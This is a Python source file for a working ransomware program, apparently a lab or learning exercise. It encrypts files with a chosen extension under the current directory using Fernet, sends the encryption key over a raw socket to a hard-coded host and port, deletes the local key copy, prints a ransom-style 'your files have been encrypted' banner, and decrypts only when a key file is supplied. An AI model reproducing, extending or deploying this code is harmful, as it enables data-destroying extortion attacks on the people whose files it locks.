import os
from os.path import expanduser
from cryptography.fernet import Fernet
import base64
import socket

class RansomWare:
    def __init__(self, key=None):
        self.key = key
        self.cryptor = None
        self.file_type = ['daniel']
        self.host = '172.16.153.107'
        self.port = 5556
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def key_gen(self):

        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)
        print(self.key)
    def read_key(self, keyfile_name):
        with open(keyfile_name, "rb") as file:
            self.key = file.read()
            self.cryptor = Fernet(self.key)

    def write_key(self, keyfile_name):
        with open(keyfile_name, "wb") as file:
            file.write(self.key)

    def search(self, encrypted):
        # FTI = [] # list of files to infect
        # filelist = os.listdir(path)
        # for name in filelist:
        #     if os.path.isdir(path+"/"+name):
        #         FTI.extend(self.search(path+"/"+name))
        #     elif name[-7:] == ".daniel":
        #         print(path+"/"+name)
        #         self.crypt(path+"/"+name, encrypted = encrypted)

        for root, _, files in os.walk('.'):
            for f in files:
                abs_file_path = os.path.join(root, f)
                if abs_file_path.split('.')[-1] in self.file_type:
                    self.crypt(abs_file_path, encrypted = encrypted)

    def crypt(self, path, encrypted = False):

        with open(path, 'rb+') as file:
            content = file.read()
        with open(path, 'wb') as f:
            if not encrypted:
                content = self.cryptor.encrypt(content)
            else:
                content = self.cryptor.decrypt(content)
                print(f'decrypted: {content}')
            f.seek(0)
            f.write(content)

    def send_key(self):
        try:
            self.conn.connect((self.host, self.port))
            with open('key', 'rb') as file:
                key = file.read()
                self.conn.send(key)
        except Exception as e:
            print(f'connection failed: {e}')

        finally:
            os.remove('key')

ransomware = RansomWare()
ransomware.key_gen()
ransomware.write_key('key')
ransomware.search(encrypted = False)
ransomware.send_key()

print('''

     OOOOOOOOO     hhhhhhh                                                      !!!
   OO:::::::::OO   h:::::h                                                     !!:!!
 OO:::::::::::::OO h:::::h                                                     !:::!
O:::::::OOO:::::::Oh:::::h                                                     !:::!
O::::::O   O::::::O h::::h hhhhh            nnnn  nnnnnnnn       ooooooooooo   !:::!
O:::::O     O:::::O h::::hh:::::hhh         n:::nn::::::::nn   oo:::::::::::oo !:::!
O:::::O     O:::::O h::::::::::::::hh       n::::::::::::::nn o:::::::::::::::o!:::!
O:::::O     O:::::O h:::::::hhh::::::h      nn:::::::::::::::no:::::ooooo:::::o!:::!
O:::::O     O:::::O h::::::h   h::::::h       n:::::nnnn:::::no::::o     o::::o!:::!
O:::::O     O:::::O h:::::h     h:::::h       n::::n    n::::no::::o     o::::o!:::!
O:::::O     O:::::O h:::::h     h:::::h       n::::n    n::::no::::o     o::::o!!:!!
O::::::O   O::::::O h:::::h     h:::::h       n::::n    n::::no::::o     o::::o !!!
O:::::::OOO:::::::O h:::::h     h:::::h       n::::n    n::::no:::::ooooo:::::o
 OO:::::::::::::OO  h:::::h     h:::::h       n::::n    n::::no:::::::::::::::o !!!
   OO:::::::::OO    h:::::h     h:::::h       n::::n    n::::n oo:::::::::::oo !!:!!
     OOOOOOOOO      hhhhhhh     hhhhhhh       nnnnnn    nnnnnn   ooooooooooo    !!!


Oops! Your files have been encrypted

Actions:

1) decrypt
''')

act = input('insert action >> ')
if act == '1':
    keyfile_path = input('insert keyfile path: ')
    if keyfile_path == '':
        print('insert key')
    else:
        ransomware.read_key(keyfile_path)
        ransomware.search(encrypted = True)
